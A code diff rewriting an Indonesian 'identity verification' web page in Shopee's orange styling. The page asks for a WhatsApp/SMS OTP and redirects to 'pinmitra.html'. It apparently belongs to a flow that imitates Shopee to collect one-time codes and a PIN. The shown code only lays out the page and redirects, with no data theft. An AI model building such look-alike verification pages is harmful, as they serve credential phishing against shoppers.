@@ -1,150 +1,126 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pilih Metode Verifikasi</title>
-    <style>
-        body {
-            font-family: "Roboto", Arial, sans-serif;
-            background-color: #f8f8f8;
-            margin: 0;
-            padding: 0;
-        }
+ <html lang="id">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Identitas</title>
+  <!-- Gaya CSS (dapat ditempatkan di sini atau di file eksternal) -->
+  <style>
+  body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f8f8f8;
+  color: #333;
+  }
 
-        header {
-            display: flex;
-            align-items: center;
-            padding: 14px 16px;
-            background: #fff;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-        }
 
-        header h1 {
-            flex: 1;
-            text-align: center;
-            font-size: 18px;
-            margin: 0;
-            font-weight: 500;
-        }
+  .container {
+  max-width: 480px;
+  margin: 20px auto;
+  padding: 20px;
+  background-color: #fff;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  }
 
-        .content {
-            padding: 20px 16px;
-            background: #fff;
-            margin-top: 10px;
-        }
 
-        .desc {
-            font-size: 15px;
-            color: #444;
-            line-height: 1.5;
-        }
+  h1 {
+  font-size: 1.5em;
+  margin-bottom: 10px;
+  }
 
-        .desc b {
-            color: #000;
-        }
 
-        .method {
-            display: flex;
-            align-items: center;
-            border-top: 1px solid #eee;
-            padding: 14px 0;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
+  p {
+  font-size: 1em;
+  margin-bottom: 20px;
+  }
 
-        .method:hover {
-            background: #f2f2f2;
-        }
 
-        .method.selected {
-            background: #e8f5e9;
-            border-left: 4px solid #25d366;
-        }
+  .verification-option {
+  margin-bottom: 15px;
+  }
 
-        .method img {
-            width: 28px;
-            height: 28px;
-            margin-right: 12px;
-            display: inline-block;
-            vertical-align: middle;
-        }
 
-        .method span {
-            flex: 1;
-            font-size: 16px;
-        }
+  .verification-option button {
+  width: 100%;
+  padding: 10px;
+  font-size: 1em;
+  background-color: #ee4d2d;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+  }
 
-        .confirm {
-            margin-top: 18px;
-            font-size: 15px;
-            color: #333;
-            text-align: center;
-            min-height: 22px;
-        }
 
-        button {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            margin-top: 20px;
-            background: #ccc;
-            color: #fff;
-            cursor: not-allowed;
-            transition: background 0.3s;
-        }
+  .verification-option button:hover {
+  background-color: #d0371a;
+  }
 
-        button.active {
-            background: #EE4D2D; /* Warna oranye Shopee */
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-<header>
-    <h1>Pilih Metode Verifikasi</h1>
-</header>
-<div class="content">
-    <p class="desc">
-        Pilih salah satu metode di bawah ini untuk mengirimkan kode verifikasi (OTP)
-        ke <b>Nomor yang terdaftar dengan akun anda</b>
-    </p>
-    <div class="method" data-method="WhatsApp">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp"/>
-        <span>WhatsApp</span>
-    </div>
-    <div class="method" data-method="SMS">
-        <img src="https://cdn-icons-png.flaticon.com/512/190/190244.png" alt="SMS"/>
-        <span>SMS</span>
-    </div>
-    <p class="confirm"></p>
-    <button id="lanjut" disabled>Lanjut</button>
-</div>
-<script>
-    const methods = document.querySelectorAll(".method");
-    const confirmText = document.querySelector(".confirm");
-    const lanjutBtn = document.getElementById("lanjut");
 
-    methods.forEach(method => {
-        method.addEventListener("click", () => {
-            // Hapus kelas "selected" dari semua
-            methods.forEach(m => m.classList.remove("selected"));
-            // Tambahkan ke yang diklik
-            method.classList.add("selected");
-            const chosen = method.dataset.method;
-            confirmText.textContent = `Kamu memilih metode verifikasi melalui ${chosen}.`;
-            // Aktifkan tombol lanjut
-            lanjutBtn.classList.add("active");
-            lanjutBtn.disabled = false;
-        });
-    });
+  .otp-form {
+  margin-top: 20px;
+  }
 
-    lanjutBtn.addEventListener("click", () => {
-        window.location.href = "pinmitra.html";
-    });
-</script>
-</body>
-</html>
+
+  .otp-form input {
+  width: 100%;
+  padding: 10px;
+  font-size: 1em;
+  border: 1px solid #ddd;
+  border-radius: 5px;
+  margin-bottom: 10px;
+  }
+
+
+  .otp-form button {
+  width: 100%;
+  padding: 10px;
+  font-size: 1em;
+  background-color: #ee4d2d;
+  color: white;
+  border: none;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s;
+  }
+
+
+  .security {
+  margin-top: 20px;
+  font-size: 0.8em;
+  color: #777;
+  }
+ </style>
+ <script>
+  function goToPinMitra() {
+  window.location.href = "pinmitra.html";
+  }
+ </script>
+ </head>
+ <body class="bg-white text-black min-h-screen">
+  <div class="container">
+  <h1>Verifikasi Identitas</h1>
+  <p>Untuk meningkatkan keamanan akun Anda, mohon verifikasi identitas Anda.</p>
+
+
+  <div class="verification-option">
+  <button onclick="goToPinMitra()">Verifikasi melalui WhatsApp/SMS</button>
+  </div>
+
+
+  <div class="otp-form" style="display:none;">
+  <p>Masukkan kode verifikasi (OTP) yang telah kami kirim:</p>
+  <input type="text" placeholder="Kode OTP">
+  <button>Verifikasi</button>
+  </div>
+
+
+  <div class="security">
+  Data Anda aman dan terlindungi.
+  </div>
+  </div>
+ </body>
+ </html>
